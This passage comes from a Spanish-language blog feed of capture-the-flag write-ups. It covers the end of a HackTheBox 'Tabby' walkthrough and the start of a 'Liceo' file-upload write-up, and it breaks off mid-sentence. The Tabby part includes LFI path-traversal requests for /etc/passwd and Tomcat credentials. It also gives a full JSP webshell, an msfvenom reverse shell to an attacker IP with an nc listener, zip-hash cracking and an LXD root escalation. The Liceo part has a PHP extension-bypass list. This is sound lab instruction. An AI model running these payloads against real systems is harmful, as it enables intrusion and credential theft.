puertos abiertos \u0026ndash;min-rate 5000 Definir el tiempo del escaneo -n Omitir resoluciÃ³n DNS -vvv Para que vaya reportando lo que encuentre por consola -Pn Para saltar la comprobaciÃ³n de sÃ­ la mÃ¡quina estÃ¡ activa o no -oG allPorts Para que guarde el escaneo en format grepeable en un archivo llamado allPort Con una funciÃ³n definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma mÃ¡s visual\nFunciÃ³n extractPorts de @s4vitar\n\u0026gt; extractPorts allPorts â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ â”‚ File: extractPorts.tmp â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ 1 â”‚ 2 â”‚ [*] Extracting information... 3 â”‚ 4 â”‚ [*] IP Address: 10.10.10.194 5 â”‚ [*] Open ports: 22,80,8080 6 â”‚ 7 â”‚ [*] Ports copied to clipboard 8 â”‚ â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ Ahora con nmap vamos a intentar buscar las versiones de los servicios que corren por los puertos y ejecutar scripts bÃ¡sicos de reconocimientos de nmap\n\u0026gt; nmap -p22,80,8080 -sCV 10.10.10.194 -oN versions Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-26 18:42 CEST Nmap scan report for skyfall.htb (10.10.11.254) Host is up (0.045s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 45:3c:34:14:35:56:23:95:d6:83:4e:26:de:c6:5b:d9 (RSA) | 256 89:79:3a:9c:88:b0:5c:ce:4b:79:b1:02:23:4b:44:a6 (ECDSA) |_ 256 1e:e7:b9:55:dd:25:8f:72:56:e8:8e:65:d5:19:b0:8d (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Mega Hosting 8080/tcp open http Apache Tomcat |_http-title: Apache Tomcat ExplicaciÃ³n parÃ¡metros\rParÃ¡metro FunciÃ³n -p Especificamos los puertos abiertos que hemos encontrado con el escaneo anterior -sC Para que realice scripts bÃ¡sicos de reconocimiento -sV Proporciona la versiÃ³n e informaciÃ³n de los servicios que corren por los puertos Puerto 80 y 8080 En el puerto 80 hay una web corriendo con apache 2.4.41.\nEmpezamos haciendo fuzzing con gobuster para encontrar subdirectorios.\n\u0026gt; gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.10.194 -x php /.php (Status: 403) [Size: 277] /index.php (Status: 200) [Size: 14175] /news.php (Status: 200) [Size: 0] /files (Status: 301) [Size: 312] [--\u0026gt; http://10.10.10.194/files/] /assets (Status: 301) [Size: 313] [--\u0026gt; http://10.10.10.194/assets/] Si accedemos en news.php, vemos una pÃ¡gina en blanco, pero si accedemos desde el botÃ³n de la pÃ¡gina principal, nos lleva a http://megahosting.htb/news.php?file=statement\nPara poder ver la pÃ¡gina, hay que aÃ±adir el dominio en el /etc/hosts\nUna vez vemos la pÃ¡gina observamos que hay un parÃ¡metro en la url que se llama file. El gobuster detecto que habÃ­a una carpeta llamada files, lo que puede estar pasando es que el parÃ¡metro ?file= este cargando el contenido de archivos que hay en files. Esto lo podemos comprobar de la siguiente forma\nVemos que lo que se muestra en news.php?file=statement es lo mismo que hay en /files/statement. Sabiendo esto probamos de explotar un LFI (Local File Inclusion)\ncurl http://megahosting.htb/news.php?file=../../../../../../../../../etc/passwd rootâŒ0:0:root:/root:/bin/bash daemonâŒ1:1:daemon:/usr/sbin:/usr/sbin/nologin binâŒ2:2:bin:/bin:/usr/sbin/nologin sysâŒ3:3:sys:/dev:/usr/sbin/nologin syncâŒ4:65534:sync:/bin:/bin/sync gamesâŒ5:60:games:/usr/games:/usr/sbin/nologin manâŒ6:12:man:/var/cache/man:/usr/sbin/nologin lpâŒ7:7:lp:/var/spool/lpd:/usr/sbin/nologin mailâŒ8:8:mail:/var/mail:/usr/sbin/nologin newsâŒ9:9:news:/var/spool/news:/usr/sbin/nologin uucpâŒ10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxyâŒ13:13:proxy:/bin:/usr/sbin/nologin www-dataâŒ33:33:www-data:/var/www:/usr/sbin/nologin backupâŒ34:34:backup:/var/backups:/usr/sbin/nologin listâŒ38:38:Mailing List Manager:/var/list:/usr/sbin/nologin ircâŒ39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnatsâŒ41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobodyâŒ65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-networkâŒ100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolveâŒ101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesyncâŒ102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebusâŒ103:106::/nonexistent:/usr/sbin/nologin syslogâŒ104:110::/home/syslog:/usr/sbin/nologin _aptâŒ105:65534::/nonexistent:/usr/sbin/nologin tssâŒ106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuiddâŒ107:112::/run/uuidd:/usr/sbin/nologin tcpdumpâŒ108:113::/nonexistent:/usr/sbin/nologin landscapeâŒ109:115::/var/lib/landscape:/usr/sbin/nologin pollinateâŒ110:1::/var/cache/pollinate:/bin/false sshdâŒ111:65534::/run/sshd:/usr/sbin/nologin systemd-coredumpâŒ999:999:systemd Core Dumper:/:/usr/sbin/nologin lxdâŒ998ğŸ’¯:/var/snap/lxd/common/lxd:/bin/false tomcatâŒ997:997::/opt/tomcat:/bin/false mysqlâŒ112:120:MySQL Server,,,:/nonexistent:/bin/false ashâŒ1000:1000:clive:/home/ash:/bin/bashc Ya tenemos la capacidad de enumerar archivos dentro de la mÃ¡quina.\nEn el /etc/passwd vemos la existencia del usuario ash, al se le puede intentar robar la llave id_rsa de ssh\ncurl http://megahosting.htb/news.php?file=../../../../../../../../../home/ash/.ssh/id_rsa Pero no podemos verla.\nSi recordamos del escaneo de nmap, habÃ­a otro puerto abierto, el 8080, este puerto tiene un tomcat corriendo. Al entrar aparece un mensaje diciendo.\nUsers are defined in /etc/tomcat9/tomcat-users.xml. Intentamos ver el archivo /etc/tomcat9/tomcat-users.xml desde el LFI, pero no se puede\ncurl http://megahosting.htb/news.php?file=../../../../../../../../../etc/tomcat9/tomcat-users.xml Haciendo una bÃºsqueda por internet, encontrÃ© que tambiÃ©n se pueden guardar en /usr/share/tomcat9/etc/tomcat-users.xml\ncurl -s http://megahosting.htb/news.php?file=../../../../../../../../../usr/share/tomcat9/etc/tomcat-users.xml | grep username you must define such a user - the username and password are arbitrary. It is \u0026lt;user username=\u0026#34;tomcat\u0026#34; password=\u0026#34;\u0026lt;must-be-changed\u0026gt;\u0026#34; roles=\u0026#34;tomcat\u0026#34;/\u0026gt; \u0026lt;user username=\u0026#34;both\u0026#34; password=\u0026#34;\u0026lt;must-be-changed\u0026gt;\u0026#34; roles=\u0026#34;tomcat,role1\u0026#34;/\u0026gt; \u0026lt;user username=\u0026#34;role1\u0026#34; password=\u0026#34;\u0026lt;must-be-changed\u0026gt;\u0026#34; roles=\u0026#34;role1\u0026#34;/\u0026gt; \u0026lt;user username=\u0026#34;tomcat\u0026#34; password=\u0026#34;$3cureP4s5w0rd123!\u0026#34; roles=\u0026#34;admin-gui,manager-script\u0026#34;/\u0026gt; Tenemos las credenciales del usuario tomcat!\nSi nos logeamos desde /manager en el tomcat, nos aparece el siguiente error\nBy default the Manager is only accessible from a browser running on the same machine as Tomcat BÃ¡sicamente que no podemos entrar, a no ser que estemos accediendo desde la misma mÃ¡quina. Si nos fijamos en los roles que tiene el usuario tomcat, vemos que tiene el rol manager-script. Este rol nos permite poder subir archivos de la siguiente forma.\nPrimero creamos un .war que nos permita ejecutar comandos\nmkdir war cd war nano index.jsp \u0026lt;form method=GET action=\u0026#39;index.jsp\u0026#39;\u0026gt; \u0026lt;input name=\u0026#39;cmd\u0026#39; type=text\u0026gt; \u0026lt;input type=submit value=\u0026#39;Run\u0026#39;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;%@ page import=\u0026#34;java.io.*\u0026#34; %\u0026gt; \u0026lt;% String cmd = request.getParameter(\u0026#34;cmd\u0026#34;); String output = \u0026#34;\u0026#34;; if(cmd != null) { String s = null; try { Process p = Runtime.getRuntime().exec(cmd,null,null); BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream())); while((s = sI.readLine()) != null) { output += s+\u0026#34;\u0026lt;/br\u0026gt;\u0026#34;; } } catch(IOException e) { e.printStackTrace(); } } %\u0026gt; \u0026lt;pre\u0026gt;\u0026lt;%=output %\u0026gt;\u0026lt;/pre\u0026gt; jar -cvf ../evil.war * cd ../ Lo subimos\ncurl --upload-file evil.war \u0026#39;http://tomcat:$3cureP4s5w0rd123!@10.10.10.194:8080/manager/text/deploy?path=/evil2\u0026amp;update=true\u0026#39; OK - Deployed application at context path [/evil2] Ya podemos ejecutar comandos\ncurl \u0026#34;megahosting.htb:8080/evil2/index.jsp?cmd=id\u0026#34; \u0026lt;form method=GET action=\u0026#39;index.jsp\u0026#39;\u0026gt; \u0026lt;input name=\u0026#39;cmd\u0026#39; type=text\u0026gt; \u0026lt;input type=submit value=\u0026#39;Run\u0026#39;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;pre\u0026gt;uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)\u0026lt;/br\u0026gt;\u0026lt;/pre\u0026gt; Para conseguir la reverse shell creamos otro .war con msfvenom\nmsfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.32 LPORT=443 -f war -o shell.war Lo subimos\ncurl --upload-file shell.war \u0026#39;http://tomcat:$3cureP4s5w0rd123!@10.10.10.194:8080/manager/text/deploy?path=/shell\u0026amp;update=true\u0026#39; Nos ponemos en escucha con nc por el puerto 443\nnc -nlvp 443 Hacemos una peticiÃ³n al archivo y recibimos la shell\ncurl \u0026#34;megahosting.htb:8080/shell/\u0026#34; Escalada de privilegios Antes de seguir, vamos a hacer un tratamiento de la tty para poder ejecutar ctr + c, ctrl + l, nano\u0026hellip;\nscript /dev/null -c bash ctrl + z\nstty raw -echo; fg reset xterm Ahora si hacemos un echo $TERM vemos que vale dumb, pero para poder hacer ctrl + l necesitamos que valga xterm\nexport TERM=xterm Por Ãºltimo si miramos la shell que tenemos echo $SHELL vemos que tenemos /usr/sbin/nologin asi que vamos a asignar una bash\nexport SHELL=bash DespuÃ©s de un rato buscando, encontramos 16162020_backup.zip.\ntomcat@tabby:/var/www/html/files$ ls 16162020_backup.zip archive revoked_certs statement Al descomprimirlo pide una contraseÃ±a\ntomcat@tabby:/var/www/html/files$ unzip 16162020_backup.zip Archive: 16162020_backup.zip checkdir error: cannot create var Read-only file system unable to process var/www/html/assets/. [16162020_backup.zip] var/www/html/favicon.ico password: Para encontrar la contraseÃ±a, nos pasamos el zip a nuestra mÃ¡quina\nLe sacamos el hash con zip2john\nzip2john 16162020_backup.zip \u0026gt; hash Ahora lo rompemos con john\njohn --wordlist=/usr/share/wordlists/rockyou.txt hash john --show hash 16162020_backup.zip:admin@it::16162020_backup.zip:var/www/html/news.php, var/www/html/favicon.ico, var/www/html/Readme.txt, var/www/html/logo.png, var/www/html/index.php:16162020_backup.zip 1 password hash cracked, 0 left La contraseÃ±a del zip es admin@it.\nDentro del zip no hay nada.\nAl probar, encontramos que esta contraseÃ±a se reutiliza para el usuario ash\nAl consultar los grupos del usuario ash identificamos que estÃ¡ en el grupo lxd\nash@tabby:~$ id uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd) Para aprovecharnos de este grupo para escalar privilegios, haremos lo siguiente en nuestra mÃ¡quina\ngit clone https://github.com/saghul/lxd-alpine-builder cd lxd-alpine-builder bash build-alpine Esto nos generarÃ¡ este archivo: alpine-v3.20-x86_64-20240606_1419.tar.gz el cual tenemos que pasar a la mÃ¡quina vÃ­ctima junto con este script searchsploit -m linux/local/46978.sh\nash@tabby:/tmp$ ./46978.sh -f alpine-v3.20-x86_64-20240606_1419.tar.gz ./46978.sh: line 21: lxc: command not found Al ejecutarlo, nos dice que el comando lxc no existe.\nLo que puede ser es que si estÃ© el lxc, pero no en el PATH, para ello vamos a buscar si hay algÃºn lxc\nash@tabby:/tmp$ find / -name lxc 2\u0026gt;/dev/null /snap/lxd/14804/bin/lxc /snap/lxd/14804/commands/lxc /snap/lxd/14804/lxc /snap/lxd/21468/bin/lxc /snap/lxd/21468/commands/lxc /snap/lxd/21468/lxc /snap/bin/lxc /var/snap/lxd/common/lxc /etc/bash_completion.d/lxc /usr/share/bash-completion/completions/lxc Efectivamente, si existe el lxc, pero no estÃ¡ en el PATH, asi que lo aÃ±adimos\nash@tabby:/tmp$ export PATH=$PATH:/snap/bin/ Ahora nos sale Error: open alpine-v3.20-x86_64-20240606_1419.tar.gz: no such file or directory\nash@tabby:/tmp$ ./46978.sh -f alpine-v3.20-x86_64-20240606_1419.tar.gz If this is your first time running LXD on this machine, you should also run: lxd init To start your first instance, try: lxc launch ubuntu:18.04 Error: open alpine-v3.20-x86_64-20240606_1419.tar.gz: no such file or directory [*] Listing images... +-------+-------------+--------+-------------+--------------+------+------+-------------+ | ALIAS | FINGERPRINT | PUBLIC | DESCRIPTION | ARCHITECTURE | TYPE | SIZE | UPLOAD DATE | +-------+-------------+--------+-------------+--------------+------+------+-------------+ Creating privesc Error: Not Found Este error me dio un poco de dolor de cabeza porque no entendÃ­a porque no funcionaba.\nAl final probÃ© de mover el archivo a otra ruta, como por ejemplo el /home de ash\nash@tabby:/tmp$ mv alpine-v3.20-x86_64-20240606_1419.tar.gz /home/ash/ ash@tabby:/tmp$ ./46978.sh -f /home/ash/alpine-v3.20-x86_64-20240606_1419.tar.gz [*] Listing images... +--------+--------------+--------+-------------------------------+--------------+-----------+--------+-----------------------------+ | ALIAS | FINGERPRINT | PUBLIC | DESCRIPTION | ARCHITECTURE | TYPE | SIZE | UPLOAD DATE | +--------+--------------+--------+-------------------------------+--------------+-----------+--------+-----------------------------+ | alpine | 099f19378603 | no | alpine v3.20 (20240606_14:19) | x86_64 | CONTAINER | 3.67MB | Jun 6, 2024 at 4:28pm (UTC) | +--------+--------------+--------+-------------------------------+--------------+-----------+--------+-----------------------------+ Creating privesc Device giveMeRoot added to privesc ~ # Ahora ya estamos dentro del contenedor que hemos creado como el usuario root\nAhora dentro del /mnt/root tenemos montada la raiz de la mÃ¡quina host\n/ # cd /mnt/root /mnt/root # ls bin etc lib64 mnt run sys boot home libx32 opt sbin tmp cdrom lib lost+found proc snap usr dev lib32 media root srv var AsÃ­ que con un cat al /mnt/root/root/root.txt vemos la flag\n","date":"2024-06-06","id":19,"permalink":"/writeups/hackthebox/tabby/","summary":"En esta mÃ¡quina, primero explotamos una vulnerabilidad de Local File Inclusion (LFI) para enumerar los usuarios de Tomcat. Luego, logramos la ejecuciÃ³n remota de cÃ³digo (RCE) subiendo un archivo .war en Tomcat. Para la escalada de privilegios, extrajimos las credenciales de un archivo zip y abusamos del grupo lxd.","tags":[],"title":"Tabby"},{"content":"","date":"2024-03-28","id":20,"permalink":"/tags/file-upload/","summary":"","tags":[],"title":"File Upload"},{"content":"Reconocimiento Para empezar lo primero es comprobar si la mÃ¡quina estÃ¡ activa y que OS tiene\n\u0026gt; ping -c 1 192.168.1.149 PING 192.168.1.149 (192.168.1.149) 56(84) bytes of data. 64 bytes from 192.168.1.149: icmp_seq=1 ttl=64 time=0.818 ms --- 192.168.1.149 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 0.818/0.818/0.818/0.000 ms Tenemos conexiÃ³n y en este caso da un ttl (time to live) de 64, entendiendo que ttl=64: Linux / ttl=128: Windows. Esta mÃ¡quina es Linux\nEscaneo de puertos Ahora empezamos con un escaneo de puertos\n$ sudo nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 192.168.1.149 -oG allPorts ExplicaciÃ³n parÃ¡metros\rParÃ¡metro FunciÃ³n -p- Para que el escaneo sea a todos los puertos (65536) \u0026ndash;open Para que solo reporte los puertos abiertos \u0026ndash;min-rate 5000 Definir el tiempo del escaneo -n Omitir resoluciÃ³n DNS -vvv Para que vaya reportando lo que encuentre por consola -Pn Para saltar la comprobaciÃ³n de sÃ­ la mÃ¡quina estÃ¡ activa o no -oG allPorts Para que guarde el escaneo en format grepeable en un archivo llamado allPort Con una funciÃ³n definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma mÃ¡s visual\nFunciÃ³n extractPorts de @s4vitar\n\u0026gt; extractPorts allPorts â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ â”‚ File: extractPorts.tmp â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ 1 â”‚ 2 â”‚ [*] Extracting information... 3 â”‚ 4 â”‚ [*] IP Address: 192.168.1.149 5 â”‚ [*] Open ports: 21,22,80 6 â”‚ 7 â”‚ [*] Ports copied to clipboard 8 â”‚ â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ Ahora con nmap vamos a intentar buscar las versiones de los servicios que corren por los puertos y ejecutar scripts bÃ¡sicos de reconocimientos de nmap\n\u0026gt; sudo nmap -p21,22,80 -sCV 192.168.1.149 -oN versions PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.5 | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_-rw-rw-r-- 1 1000 1000 191 Feb 01 14:29 note.txt | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:192.168.1.145 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 3 | vsFTPd 3.0.5 - secure, fast, stable |_End of status 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 68:4c:42:8d:10:2c:61:56:7b:26:c4:78:96:6d:28:15 (ECDSA) |_ 256 7e:1a:29:d8:9b:91:44:bd:66:ff:6a:f3:2b:c7:35:65 (ED25519) 80/tcp open http Apache httpd 2.4.52 ((Ubuntu)) |_http-title: Liceo |_http-server-header: Apache/2.4.52 (Ubuntu) ExplicaciÃ³n parÃ¡metros\rParÃ¡metro FunciÃ³n -p Especificamos los puertos abiertos que hemos encontrado con el escaneo anterior -sC Para que realice scripts bÃ¡sicos de reconocimiento -sV Proporciona la versiÃ³n e informaciÃ³n de los servicios que corren por los puertos FTP Nmap ha reportado que el puerto 21 estÃ¡ abierto, tiene un FTP con el \u0026ldquo;Anonymous login allowed\u0026rdquo; y dentro hay un archivo llamado note.txt\n\u0026gt; wget ftp://192.168.1.149/note.txt note.txt 100%[=========================================================================================================================\u0026gt;] 191 --.-KB/s in 0s 2024-03-28 14:19:49 (891 KB/s) - â€˜note.txtâ€™ saved [191] \u0026gt; cat note.txt â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ â”‚ File: note.txt â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ 1 â”‚ Hi Matias, I have left on the web the continuations of today\u0026#39;s work, 2 â”‚ would you mind contiuing in your turn and make sure that the web will be secure? 3 â”‚ Above all, we dont\u0026#39;t want intruders... â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ Hola Matias, te he dejado en la web las continuaciones del trabajo de hoy, Â¿Te importarÃ­a continuar en tu turno y asegurarte de que la web sea segura? Sobre todo, no queremos intrusos... Con este mensaje podemos deducir un posible usuario llamado Matias.\nHTTP Empezamos analizando la web con whatweb\n\u0026gt; whatweb 192.168.1.149 http://192.168.1.149 [200 OK] Apache[2.4.52], Bootstrap, Country[RESERVED][ZZ], Email[liceoescuela@liceo.com], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[192.168.1.149], JQuery[3.4.1], Script, Title[Liceo], X-UA-Compatible[IE=edge] Tenemos un email: liceoescuela@liceo.com\nEsta direcciÃ³n de correo usa el dominio liceo.com. Esta informaciÃ³n la podemos usar para despuÃ©s buscar subdominios.\nSi consultamos la pÃ¡gina web desde el navegador, no vemos ninguna funciÃ³n destacable, asÃ­ que procedemos a hacer fuzzing para encontrar subdirectorios con la herramienta gobuster\n\u0026gt; gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.1.149 -x php,html,txt =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://192.168.1.149 [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Extensions: php,html,txt [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /.php (Status: 403) [Size: 278] /images (Status: 301) [Size: 315] [--\u0026gt; http://192.168.1.149/images/] /index.html (Status: 200) [Size: 21487] /.html (Status: 403) [Size: 278] /uploads (Status: 301) [Size: 316] [--\u0026gt; http://192.168.1.149/uploads/] /upload.php (Status: 200) [Size: 371] /css (Status: 301) [Size: 312] [--\u0026gt; http://192.168.1.149/css/] /js (Status: 301) [Size: 311] [--\u0026gt; http://192.168.1.149/js/] RÃ¡pidamente aparecen 2 rutas las cuales llaman la atenciÃ³n: uploads y upload.php\nEn el upload.php podemos subir un archivo, vamos a subir un php simplÃ³n y lo interceptaremos con burpsuite\nNos aparece un error diciendo que no se pueden subir archivos con la extensiÃ³n php. Los scripts en php pueden usar otras extensiones que no sean php, para descubrir cuÃ¡les son las que bloquea vamos a usar el intruder de burpsuite.\nAÃ±adimos la extensiÃ³n como variable y subimos un payload con todas las extensiones\n\u0026gt; cat Downloads/extensions.txt â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ â”‚ File: Downloads/extensions.txt â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ 1 â”‚ php 2 â”‚ php2 3 â”‚ php3 4 â”‚ php4 5 â”‚ php5 6 â”‚ php6 7 â”‚ php7 8 â”‚ phps 9 â”‚ phps 10 â”‚ pht 11 â”‚ phtm 12 â”‚ phtml 13 â”‚ pgif 14 â”‚ shtml 15 â”‚ htaccess 16 â”‚ phar 17 â”‚ inc 18 â”‚ hphp 19 â”‚ ctp 20 â”‚ module â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ Ahora ya podemos ver el resultado con las demÃ¡s 